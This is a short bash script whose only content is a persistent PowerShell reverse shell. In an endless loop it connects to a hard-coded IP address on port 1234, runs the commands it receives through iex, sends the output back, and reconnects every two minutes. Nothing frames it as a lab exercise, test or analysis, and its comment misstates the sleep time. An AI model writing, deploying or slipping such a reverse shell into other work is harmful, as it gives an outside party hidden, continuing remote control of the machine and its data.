#!/usr/bin/env bash
while true; do
	powershell -c "\$client = New-Object System.Net.Sockets.TCPClient('164.92.93.171',1234); \$stream = \$client.GetStream(); [byte[]]\$bytes = 0..65535|%{0}; while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){ \$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i); \$sendback = (iex \$data 2>&1 | Out-String); \$sendback2 = \$sendback + 'PS ' + (Get-Location).Path + '> '; \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2); \$stream.Write(\$sendbyte,0,\$sendbyte.Length); \$stream.Flush()}; \$client.Close()"
    sleep 120  # 300 seconds = 2 minutes
done